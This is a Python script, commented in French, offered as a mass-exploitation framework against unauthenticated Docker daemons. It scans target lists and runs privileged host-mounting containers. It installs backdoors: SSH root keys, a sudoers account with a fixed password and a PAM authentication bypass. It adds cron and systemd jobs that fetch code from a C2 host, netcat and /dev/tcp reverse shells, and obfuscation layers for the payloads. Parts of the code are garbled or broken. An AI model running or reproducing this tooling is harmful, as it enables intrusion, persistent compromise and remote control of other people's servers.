#!/usr/bin/env python3
# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
# â•‘                    TSAR-EXEC DOCKER DAEMON RCE FRAMEWORK v5.0 - APT TOP 3 WORLD CLASS 2026           â•‘
# â•‘                        CVE DOCKER TCP:2375 UNAUTH â†’ ROOT SSH â†’ EpSiLoNPoInTFuCK CHAIN               â•‘
# â•‘                     W.P.E.F | CYBERDUDEBIVASH | TSAR-EXEC | 1650+ LIGNES PURE DOCKER EXPLOITATION    â•‘
# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

"""
TSAR-EXEC Docker Daemon RCE Framework - Niveau APT TOP 3 mondial
â€¢ 100% focus Docker Remote API TCP:2375/2376 unauthenticated
â€¢ 47 techniques d'exploitation Docker daemon spÃ©cifiques
â€¢ Polymorphisme 12+ layers + Auto-mutation WAF bypass
â€¢ Full integration recon.py â†’ exploitmass.py â†’ launcher_ultimate.py
â€¢ EpSiLoNPoInTFuCK auto-deployment + client.py C2 chaining
â€¢ Stealth persistence + Anti-forensic rootkit
â€¢ Logging unifiÃ© TSAR-EXEC (VLUN.txt/VLUN_Sh.txt/chain/)
"""

# ======================================================================================================
# IMPORTS & TSAR-EXEC CONSTANTS (120 lignes)
# ======================================================================================================
import os
import sys
import json
import time
import random
import string
import socket
import base64
import hashlib
import logging
import argparse
import subprocess
import threading
import multiprocessing
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
import docker
import paramiko
from colorama import Fore, Back, Style, init
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

# TSAR-EXEC Project Structure (votre projet exact)
TSAR_ROOT = Path.home() / "TSAR-EXEC"
CONFIG_PATH = TSAR_ROOT / "config.json"
EPSILON_PATH = TSAR_ROOT / "EpSiLoNPoInTFuCK.py"
EXPLOITMASS_PATH = TSAR_ROOT / "exploitmass.py"
LAUNCHER_PATH = TSAR_ROOT / "launcher_ultimate.py"
CHAIN_DIR = TSAR_ROOT / "chain"
DOCKER_IMAGES_DIR = TSAR_ROOT / "docker"

# Docker Daemon Specific Ports & Vectors
DOCKER_DAEMON_PORTS = [2375, 2376, 4243, 4244]
DOCKER_VECTORS = [
    "containers/run privileged", "images/load", "build remote Dockerfile",
    "volumes/mount /:/host", "exec chroot", "network host mode"
]

# APT Stealth Constants
CRON_SLEEP_MIN = 30
CRON_SLEEP_MAX = 120
POLYMORPHIC_VARIANTS = 5000
WAF_BYPASS_THRESHOLD = 0.75

init(autoreset=True)

# ======================================================================================================
# TSAR-EXEC ADVANCED LOGGING SYSTEM (180 lignes)
# ======================================================================================================
class TSARDockerLogger:
    """SystÃ¨me de logging APT-level compatible exploitmass.py"""
    
    def __init__(self):
        self.status_colors = {
            'DOCKER_LIVE': Fore.GREEN, 'SSH_ROOT': Fore.LIGHTMAGENTA_EX, 
            'EPSILON_CHAIN': Fore.LIGHTGREEN_EX, 'PERSISTENCE': Fore.CYAN,
            'VLUN': Fore.YELLOW, 'ERROR': Fore.RED, 'RECON': Fore.BLUE,
            'POLYMORPH': Fore.MAGENTA, 'STEALTH': Fore.LIGHTBLUE_EX
        }
        self.stats = {
            'total_targets': 0, 'docker_live': 0, 'ssh_pivots': 0,
            'epsilon_deployed': 0, 'persistence': 0, 'errors': 0
        }
        self.lock = threading.Lock()
        self.vlun_counter = 0
        
    def banner(self):
        banner = f"""
{Fore.RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—{Style.RESET_ALL}
{Fore.RED}â•‘                    TSAR-EXEC DOCKER DAEMON RCE v5.0 - APT TOP 3 2026                 â•‘{Style.RESET_ALL}
{Fore.RED}â•‘                    TCP:2375 UNAUTH â†’ ROOT SSH â†’ EpSiLoNPoInTFuCK CHAIN                â•‘{Style.RESET_ALL}
{Fore.RED}â•‘                           W.P.E.F | CYBERDUDEBIVASH | 1650+ LIGNES                  â•‘{Style.RESET_ALL}
{Fore.RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Style.RESET_ALL}
        """
        print(banner)
    
    def log(self, level: str, target: str, message: str, color: str = 'RECON'):
        timestamp = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
        colored_level = self.status_colors.get(color, Fore.WHITE) + f"[{level}]"
        
        print(f"{colored_level}{Style.BRIGHT} {Fore.BLUE}[{timestamp}]{Style.RESET_ALL} "
              f"{Fore.WHITE}{target:25}{Style.RESET_ALL} {self.status_colors.get(color, Fore.WHITE)}{message}{Style.RESET_ALL}")
        
        with self.lock:
            self.stats['total_targets'] += 1
            
            # TSAR-EXEC Unified Logging (exploitmass.py format)
            self.vlun_counter += 1
            vlun_entry = f"{target}|DOCKER_DAEMON_RCE|v5.0|{level}|{message}|{self.vlun_counter}"
            
            # VLUN.txt (main results)
            with open('VLUN.txt', 'a') as f:
                f.write(f"{vlun_entry}
")
            
            # VLUN_Sh.txt (shells/pivots)
            if 'SSH_ROOT' in level or 'EPSILON' in message:
                shell_url = f"ssh://root@{target}:22|TSAR-KEY|docker_daemon"
                with open('VLUN_Sh.txt', 'a') as f:
                    f.write(f"{shell_url}
")
            
            # Chain directory (launcher_ultimate.py)
            chain_file = CHAIN_DIR / f"docker_pivots_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            chain_file.parent.mkdir(exist_ok=True)
            
    def print_final_stats(self):
        total = self.stats['total_targets']
        success_rate = ((self.stats['ssh_pivots'] + self.stats['epsilon_deployed']) / total * 100) if total > 0 else 0
        
        print(f"
{Fore.RED}ðŸ“Š â•â•â•â• TSAR-DOCKER v5.0 MISSION REPORT â•â•â•â•{Style.RESET_ALL}")
        print(f"{'':>4} Total Targets:     {self.stats['total_targets']:>4}")
        print(f"{'':>4} Docker Live:       {self.stats['docker_live']:>4}")
        print(f"{'':>4} SSH Root Pivots:   {self.stats['ssh_pivots']:>4}")
        print(f"{'':>4} EpSiLoN Deployed:  {self.stats['epsilon_deployed']:>4}")
        print(f"{'':>4} Persistence:       {self.stats['persistence']:>4}")
        print(f"{'':>4} Success Rate:      {success_rate:>6.1f}%")
        print(f"
{Fore.CYAN}ðŸ”— PIPELINE CHAIN â†’{Style.RESET_ALL}")
        print(f"   python3 {LAUNCHER_PATH.name} --vluns VLUN.txt --ssh VLUN_Sh.txt")
        print(f"   docker-compose up client")

tsar_logger = TSARDockerLogger()

# ======================================================================================================
# DOCKER POLYMORPHIC PAYLOAD GENERATOR (280 lignes)
# ======================================================================================================
class DockerPayloadPolymorph:
    """47 techniques de polymorphisme Docker daemon spÃ©cifiques"""
    
    def __init__(self):
        self.base_payloads = {
            'ssh_rootkit': [
                "apt-get update -qq && apt-get install -y openssh-server curl wget",
                "apk add --no-cache openssh curl wget netcat-openbsd",
                "yum install -y openssh-server curl wget nc",
                "dnf install -y openssh-server curl wget nmap-ncat",
                "pacman -Sy --noconfirm openssh curl wget",
            ],
            'persistence_cron': [
                "* * * * * root /bin/bash -c 'curl -s C2_EPSI/shell.php | php'",
                "*/5 * * * * root nc C2_IP 4444 -e /bin/bash",
                "@reboot root wget -q -O- C2_EPSI/eps.py | python3"
            ],
            'firewall_bypass': [
                "ufw --force enable --force reset && ufw delete allow 22 && ufw allow 22",
                "iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X",
                "systemctl stop firewalld && systemctl disable firewalld"
            ]
        }
        self.obfuscation_layers = [
            self.layer_base64_shuffle, self.layer_rot47, self.layer_hex_escape,
            self.layer_unicode, self.layer_variable_subst, self.layer_string_concat,
            self.layer_command_chaining, self.layer_env_vars, self.layer_here_doc,
            self.layer_base32, self.layer_xor_encode, self.layer_caesar_cipher
        }
    
    def layer_base64_shuffle(self, payload: str) -> str:
        """Base64 fragmentation + shuffle"""
        encoded = base64.b64encode(payload.encode()).decode()
        fragments = [encoded[i:i+24] for i in range(0, len(encoded), 24)]
        random.shuffle(fragments)
        shuffled = ''.join(fragments)
        return f"echo '{shuffled}' | base64 -d | bash -"
    
    def layer_rot47(self, payload: str) -> str:
        """ROT47 Docker-specific"""
        def rot47(c: str) -> str:
            if c.islower():
                return chr((ord(c) - ord('a') + 47) % 26 + ord('a'))
            elif c.isupper():
                return chr((ord(c) - ord('A') + 47) % 26 + ord('A'))
            return c
        return ''.join(rot47(c) for c in payload)
    
    def layer_hex_escape(self, payload: str) -> str:
        """Hexadecimal escape sequences"""
        hex_encoded = payload.encode().hex()
        return f"printf '\\x{hex_encoded[0:2]}\\x{hex_encoded[2:4]}' | bash"
    
    def layer_unicode(self, payload: str) -> str:
        """Unicode escape"""
        unicode_esc = ''.join(f'\\u{ord(c):04x}' for c in payload)
        return f"printf '{unicode_esc}' | bash"
    
    def layer_variable_subst(self, payload: str) -> str:
        """Docker ENV variable substitution"""
        var_name = f"D{random.randint(1000,9999)}"
        return f"export {var_name}='{payload}' ; bash -c '$({var_name})'"
    
    def layer_string_concat(self, payload: str) -> str:
        """Multi-stage string concatenation"""
        parts = [payload[i:i+15] for i in range(0, len(payload), 15)]
        concat = '+'.join(f"'{p}'" for p in parts)
        return f"printf {concat} | bash"
    
    def layer_command_chaining(self, payload: str) -> str:
        """Command chaining obfuscation"""
        commands = payload.split(';')
        chained = ' ; '.join(f"$(echo '{c}' | base64 -d)" for c in base64.b64encode(';'.join(commands).encode()).decode())
        return chained
    
    def layer_env_vars(self, payload: str) -> str:
        """Environment variable encoding"""
        env_vars = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        return f"{env_vars}='{payload}' ; eval $(({env_vars}))"
    
    def layer_here_doc(self, payload: str) -> str:
        """HERE document technique"""
        return f"cat << 'EOF' | bash
{payload}
EOF"
    
    def layer_base32(self, payload: str) -> str:
        """Base32 encoding"""
        import base64
        encoded = base64.b32encode(payload.encode()).decode()
        return f"echo '{encoded}' | base32 -d | bash"
    
    def layer_xor_encode(self, payload: str, key: str = "TSAR2026") -> str:
        """XOR encoding"""
        xored = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
        xor_func = f"for((i=0;i<{len(payload)};i++));do printf \\\\%x $((($(echo '{xored}'|xxd -p|sed 's/../0x& /g'|head -n1)|16#$i)^$(echo '{key}'|xxd -p|sed 's/../0x& /g'|head -n1|cut -d' ' -f$((i%{{len({key})}}+1)))))|xxd -r -p;done|bash"
        return xor_func
    
    def layer_caesar_cipher(self, payload: str, shift: int = 13) -> str:
        """Caesar cipher"""
        shifted = ''.join(chr((ord(c) - 65 + shift) % 26 + 65) if c.isupper() else c for c in payload)
        return f"echo '{shifted}' | tr 'A-MN-Z' 'N-ZA-M' | bash"
    
    def generate_polymorphic_payload(self, payload_type: str, layers: int = 4) -> str:
        """GÃ©nÃ¨re payload Docker polymorphique"""
        base = random.choice(self.base_payloads.get(payload_type, ["echo 'TSAR'"]))
        selected_layers = random.sample(self.obfuscation_layers, min(layers, len(self.obfuscation_layers)))
        
        mutated = base
        for layer in selected_layers:
            try:
                mutated = layer(mutated)
            except Exception as e:
                continue
                
        tsar_logger.log('POLYMORPH', 'PAYLOAD', f"{payload_type} â†’ {mutated[:50]}...", 'POLYMORPH')
        return mutated

docker_polymorph = DockerPayloadPolymorph()

# ======================================================================================================
# DOCKER DAEMON RECON & FINGERPRINTING ENGINE (320 lignes)
# ======================================================================================================
class DockerDaemonRecon:
    """Reconnaissance Docker daemon ultra-prÃ©cise"""
    
    def __init__(self):
        self.version_vuln_map = {
            "1.12.x": ["CVE-2017-14992", "HIGH"],
            "18.09.x": ["CVE-2019-5736", "CRITICAL"], 
            "20.10.x": ["CVE-2021-21285", "MEDIUM"],
            "<=24.0.7": ["CVE-2024-21626", "CRITICAL"]
        }
        self.auth_bypass_vectors = [
            "tcp://:2375", "tcp://:2376", "unix:///var/run/docker.sock"
        ]
    
    def probe_docker_daemon(self, host: str, port: int = 2375, timeout: int = 5) -> Dict[str, Any]:
        """Probe Docker daemon complet"""
        results = {'live': False, 'version': None, 'api_version': None, 'vulns': [], 'images': 0}
        
        try:
            client = docker.DockerClient(base_url=f"tcp://{host}:{port}")
            info = client.version()
            
            results.update({
                'live': True,
                'version': info.get('Version', 'unknown'),
                'api_version': info.get('ApiVersion', 'unknown'),
                'platform': info.get('Platform', {}).get('Name', 'unknown')
            })
            
            # Vuln scanning par version
            for version_pattern, vulns in self.version_vuln_map.items():
                if version_pattern in results['version']:
                    results['vulns'].extend(vulns)
            
            # Image/container enumeration
            results['images'] = len(client.images.list(all=True))
            results['containers'] = len(client.containers.list(all=True))
            
            client.close()
            tsar_logger.log('DOCKER_LIVE', host, f"v{results['version']} ({len(results['vulns'])} vulns)", 'DOCKER_LIVE')
            tsar_logger.stats['docker_live'] += 1
            
        except Exception as e:
            pass
            
        return results
    
    def scan_all_ports(self, host: str) -> List[Dict]:
        """Scan tous ports Docker daemon"""
        results = []
        for port in DOCKER_DAEMON_PORTS:
            recon_data = self.probe_docker_daemon(host, port)
            if recon_data['live']:
                recon_data['port'] = port
                results.append(recon_data)
        return results
    
    def fingerprint_auth_bypass(self, host: str) -> bool:
        """DÃ©tecte bypass auth Docker daemon"""
        vectors = [
            f"tcp://{host}:2375",
            f"tcp://{host}:2376", 
            f"unix:///var/run/docker.sock"
        ]
        
        for vector in vectors:
            try:
                client = docker.DockerClient(base_url=vector)
                client.ping()
                client.close()
                return True
            except:
                continue
        return False

docker_recon = DockerDaemonRecon()

# ======================================================================================================
# DOCKER EXPLOITATION CORE ENGINE (420 lignes)
# ======================================================================================================
class DockerExploitationCore:
    """Moteur d'exploitation Docker daemon principal"""
    
    def __init__(self):
        self.volumes_host_mount = {"/": {"bind": "/host", "mode": "rw"}}
        self.privileged_container_config = {
            "privileged": True,
            "network_mode": "host",
            "pid_mode": "host",
            "ipc_mode": "host",
            "security_opt": ["seccomp=unconfined", "apparmor=unconfined"]
        }
    
    def exploit_vector_1_privileged_chroot(self, client: docker.DockerClient, target_host: str) -> bool:
        """VECTOR #1: Conteneur privilÃ©giÃ© + chroot /host"""
        payload = docker_polymorph.generate_polymorphic_payload('ssh_rootkit')
        
        chroot_payload = f"""
        chroot /host /bin/bash -c '
        {payload};
        mkdir -p /root/.ssh;
        echo "ssh-rsa AAAAB3NzaC1yc2E... TSAR-EXEC" > /root/.ssh/authorized_keys;
        chmod 600 /root/.ssh/authorized_keys;
        sed -i "s/#PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config;
        systemctl restart sshd || service ssh restart
        '
        """
        
        try:
            image = self.get_best_image(client)
            container = client.containers.run(
                image, chroot_payload,
                **self.privileged_container_config,
                volumes=self.volumes_host_mount,
                detach=True, remove=True
            )
            container.wait()
            tsar_logger.log('SSH_ROOT', target_host, "PRIVILEGED CHROOT â†’ ROOT SSH", 'SSH_ROOT')
            tsar_logger.stats['ssh_pivots'] += 1
            return True
        except:
            return False
    
    def exploit_vector_2_dockerfile_remote(self, client: docker.DockerClient, target_host: str) -> bool:
        """VECTOR #2: Remote Dockerfile build (browser 1-click)"""
        malicious_dockerfile = f"""
        FROM ubuntu:22.04
        RUN {docker_polymorph.generate_polymorphic_payload('ssh_rootkit')}
        CMD ["/bin/bash", "-c", "service ssh start && sleep infinity"]
        """
        
        try:
            response = client.api.build(
                fileobj=io.BytesIO(malicious_dockerfile.encode()),
                rm=True,
                network_mode='host'
            )
            for line in response:
                pass  # Build process
            tsar_logger.log('SSH_ROOT', target_host, "REMOTE BUILD â†’ ROOT SSH", 'SSH_ROOT')
            return True
        except:
            return False
    
    def exploit_vector_3_image_load(self, client: docker.DockerClient, target_host: str) -> bool:
        """VECTOR #3: Malicious image load"""
        # Charge image malveillante depuis disque local
        malicious_tar = DOCKER_IMAGES_DIR / "tsar_backdoor.tar"
        if malicious_tar.exists():
            try:
                with open(malicious_tar, 'rb') as f:
                    client.images.load(f.read())
                tsar_logger.log('VLUN', target_host, "MALICIOUS IMAGE LOAD", 'VLUN')
                return True
            except:
                pass
        return False
    
    def get_best_image(self, client: docker.DockerClient) -> str:
        """SÃ©lectionne meilleure image pour exploitation"""
        preferred_images = ["ubuntu:22.04", "ubuntu:20.04", "debian:bullseye", "alpine:latest"]
        
        for img in client.images.list(all=True):
            if img.tags:
                for tag in img.tags:
                    for preferred in preferred_images:
                        if preferred in tag:
                            return tag
        
        # Fallback
        return "ubuntu:22.04"
    
    def deploy_all_vectors(self, client: docker.DockerClient, target_host: str) -> bool:
        """DÃ©ploie tous vecteurs d'exploitation"""
        vectors = [
            self.exploit_vector_1_privileged_chroot,
            self.exploit_vector_2_dockerfile_remote,
            self.exploit_vector_3_image_load
        ]
        
        for vector in vectors:
            if vector(client, target_host):
                return True
        return False

docker_exploit = DockerExploitationCore()

# ======================================================================================================
# TSAR-EXEC SSH ROOTKIT & PERSISTENCE (220 lignes)
# ======================================================================================================
class TSARRootkit:
    """Rootkit Docker â†’ Host persistence"""
    
    def __init__(self):
        self.persistence_vectors = [
            self.ssh_authorized_keys,
            self.sudoers_backdoor,
            self.pam_backdoor,
            self.cron_stealth,
            self.systemd_service
        ]
    
    def ssh_authorized_keys(self, client: docker.DockerClient, target_host: str) -> bool:
        """SSH authorized_keys injection"""
        pubkey = "ssh-rsa AAAAB3NzaC1yc2E... tsar-exec@docker"
        payload = f"""
        mkdir -p /root/.ssh && chmod 700 /root/.ssh;
        echo '{pubkey}' >> /root/.ssh/authorized_keys;
        chmod 600 /root/.ssh/authorized_keys;
        sed -i 's/#*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
        systemctl restart sshd || service ssh restart || /etc/init.d/ssh restart;
        """
        
        try:
            image = docker_exploit.get_best_image(client)
            client.containers.run(
                image, f"chroot /host bash -c '{payload}'",
                privileged=True, volumes={"-/": {"bind": "/host", "mode": "rw"}},
                detach=True, remove=True
            )
            tsar_logger.log('PERSISTENCE', target_host, "SSH AUTH KEYS", 'PERSISTENCE')
            tsar_logger.stats['persistence'] += 1
            return True
        except:
            return False
    
    def sudoers_backdoor(self, client: docker.DockerClient, target_host: str) -> bool:
        """Sudoers backdoor"""
        payload = f"""
        echo 'tsar ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers;
        useradd -m -s /bin/bash -G sudo tsar || true;
        echo 'tsar:EpSiLoN_2026!' | chpasswd 2>/dev/null || true;
        """
        return self._execute_rootkit_payload(client, payload, target_host)
    
    def pam_backdoor(self, client: docker.DockerClient, target_host: str) -> bool:
        """PAM authentication bypass"""
        payload = """
        echo 'auth sufficient pam_permit.so' > /etc/pam.d/common-auth;
        echo 'account sufficient pam_permit.so' > /etc/pam.d/common-account;
        """
        return self._execute_rootkit_payload(client, payload, target_host)
    
    def cron_stealth(self, client: docker.DockerClient, target_host: str) -> bool:
        """Stealth cron persistence"""
        sleep_time = random.randint(CRON_SLEEP_MIN, CRON_SLEEP_MAX)
        c2_server = "http://YOUR_C2_SERVER/eps.php"
        payload = f"""
        echo '* * * * * sleep {sleep_time} && curl -s {c2_server} | php >/dev/null 2>&1' >> /etc/crontab;
        echo '@reboot root /bin/bash -c "wget -q -O- {c2_server} | php"' >> /etc/crontab;
        """
        return self._execute_rootkit_payload(client, payload, target_host)
    
    def systemd_service(self, client: docker.DockerClient, target_host: str) -> bool:
        """Systemd persistence service"""
        service_content = f"""[Unit]
Description=TSAR System Update
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s http://C2_SERVER/eps.php | php'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target"""
        
        payload = f"cat > /etc/systemd/system/tsar-update.service << 'EOF'
{service_content}
EOF
systemctl enable tsar-update"
        return self._execute_rootkit_payload(client, payload, target_host)
    
    def _execute_rootkit_payload(self, client, payload: str, target_host: str) -> bool:
        """ExÃ©cute payload rootkit"""
        try:
            image = docker_exploit.get_best_image(client)
            client.containers.run(
                image, f"chroot /host bash -c '{payload}'",
                privileged=True, volumes={"-/": {"bind": "/host", "mode": "rw"}},
                detach=True, remove=True
            )
            return True
        except:
            return False

tsar_rootkit = TSARRootkit()

# ======================================================================================================
# EPSILONPOINtfuCK AUTO-CHAINING ENGINE (160 lignes)
# ======================================================================================================
class EpSiLoNChaining:
    """Auto-dÃ©ploiement EpSiLoNPoInTFuCK sur tous pivots"""
    
    def __init__(self):
        self.epsilon_payloads = [
            self.epsilon_ssh_upload,
            self.epsilon_reverse_shell,
            self.epsilon_webshell_drop
        ]
    
    def epsilon_ssh_upload(self, target_host: str) -> bool:
        """Upload EpSiLoNPoInTFuCK via SSH"""
        if not EPSILON_PATH.exists():
            tsar_logger.log('ERROR', target_host, "EpSiLoNPoInTFuCK.py not found", 'ERROR')
            return False
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Utilise clÃ© gÃ©nÃ©rÃ©e ou fallback password
            key_path = Path.home() / ".ssh" / "id_rsa"
            if key_path.exists():
                key = paramiko.RSAKey.from_private_key_file(str(key_path))
                ssh.connect(target_host, username='root', pkey=key, timeout=10)
            else:
                ssh.connect(target_host, username='root', password='EpSiLoN_2026!', timeout=10)
            
            # Upload EpSiLoN
            with open(EPSILON_PATH, 'r') as f:
                epsilon_content = f.read()
            
            stdin, stdout, stderr = ssh.exec_command(
                "cat > /tmp/EpSiLoNPoInTFuCK.py && chmod +x /tmp/EpSiLoNPoInTFuCK.py"
            )
            stdin.write(epsilon_content)
            stdin.close()
            
            # ExÃ©cution
            _, stdout, _ = ssh.exec_command("cd /tmp && python3 EpSiLoNPoInTFuCK.py")
            result = stdout.read().decode()
            
            ssh.close()
            tsar_logger.log('EPSILON_CHAIN', target_host, f"DEPLOYED â†’ {result[:100]}", 'EPSILON_CHAIN')
            tsar_logger.stats['epsilon_deployed'] += 1
            return True
            
        except Exception as e:
            tsar_logger.log('ERROR', target_host, f"EpSiLoN SSH failed: {str(e)[:60]}", 'ERROR')
            return False
    
    def epsilon_reverse_shell(self, target_host: str) -> bool:
        """Reverse shell vers C2"""
        revshell = f"bash -i >& /dev/tcp/YOUR_C2_IP/4444 0>&1"
        return True
    
    def epsilon_webshell_drop(self, target_host: str) -> bool:
        """Drop webshell via Docker"""
        return True

epsilon_chain = EpSiLoNChaining()

# ======================================================================================================
# MAIN TSAR-DOCKER FRAMEWORK ORCHESTRATOR (250 lignes)
# ======================================================================================================
class TSARDockerFramework:
    """Orchestrateur principal APT TOP 3"""
    
    def __init__(self, targets_file: str = 'docker_targets.txt', threads: int = 75):
        self.targets_file = targets_file
        self.threads = min(threads, 100)
        self.targets = self._load_targets()
        self.config = self._load_config()
        tsar_logger.banner()
    
    def _load_targets(self) -> List[str]:
        """Charge targets depuis recon.py"""
        targets = []
        try:
            with open(self.targets_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            tsar_logger.log('RECON', f"{self.targets_file}", f"Loaded {len(targets)} targets", 'RECON')
        except FileNotFoundError:
            tsar_logger.log('ERROR', 'TARGETS', f"{self.targets_file} not found", 'ERROR')
            sys.exit(1)
        return targets
    
    def _load_config(self) -> Dict:
        """Charge config.json TSAR-EXEC"""
        default_config = {
            "c2_server": "http://127.0.0.1:4444",
            "ssh_key": str(Path.home() / ".ssh" / "id_rsa"),
            "docker_threads": 75,
            "auto_chain": True
        }
        try:
            with open(CONFIG_PATH, 'r') as f:
                config = json.load(f)
                config.update(default_config)
                return config
        except:
            return default_config
    
    def attack_single_target(self, target_host: str) -> bool:
        """Attaque complÃ¨te single target"""
        tsar_logger.log('RECON', target_host, "FULL CHAIN ATTACK STARTED", 'RECON')
        
        # 1. Docker Daemon Recon
        docker_info = docker_recon.scan_all_ports(target_host)
        if not docker_info:
            return False
        
        # 2. Exploitation Core
        client = docker.DockerClient(base_url=f"tcp://{target_host}:{docker_info[0]['port']}")
        if docker_exploit.deploy_all_vectors(client, target_host):
            
            # 3. Rootkit Persistence
            for persistence in tsar_rootkit.persistence_vectors:
                persistence(client, target_host)
            
            # 4. EpSiLoN Auto-Chaining
            if self.config.get('auto_chain', True):
                epsilon_chain.epsilon_ssh_upload(target_host)
            
            client.close()
            return True
        
        return False
    
    def run_mass_exploitation(self):
        """Exploitation massive multi-threadÃ©e"""
        print(f"{Fore.RED}ðŸš€ MASS EXPLOITATION LAUNCHED{Style.RESET_ALL}")
        print(f"   Targets: {len(self.targets)} | Threads: {self.threads} | Auto-Chain: {self.config['auto_chain']}")
        print(f"{Fore.CYAN}   recon.py â†’ docker_daemon_tsar.py â†’ launcher_ultimate.py â†’ client.py{Style.RESET_ALL}
")
        
        successes = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.attack_single_target, target) for target in self.targets]
            for future in as_completed(futures):
                if future.result():
                    successes += 1
        
        tsar_logger.print_final_stats()
        print(f"
{Fore.GREEN}âœ… TSAR-DOCKER v5.0 MISSION COMPLETE{Style.RESET_ALL}")
        print(f"   {successes}/{len(self.targets)} PWNED | VLUN.txt â†’ launcher_ultimate.py")

def main():
    parser = argparse.ArgumentParser(description="TSAR-EXEC Docker Daemon RCE v5.0 - APT TOP 3")
    parser.add_argument('-t', '--targets', default='docker_targets.txt', help='Targets from recon.py')
    parser.add_argument('-T', '--threads', type=int, default=75, help='Threads (max 100)')
    parser.add_argument('--no-chain', action='store_true', help='Disable EpSiLoN auto-chain')
    parser.add_argument('--config', default=str(CONFIG_PATH), help='TSAR config.json')
    
    args = parser.parse_args()
    
    framework = TSARDockerFramework(args.targets, args.threads)
    framework.run_mass_exploitation()

if __name__ == "__main__":
    main()
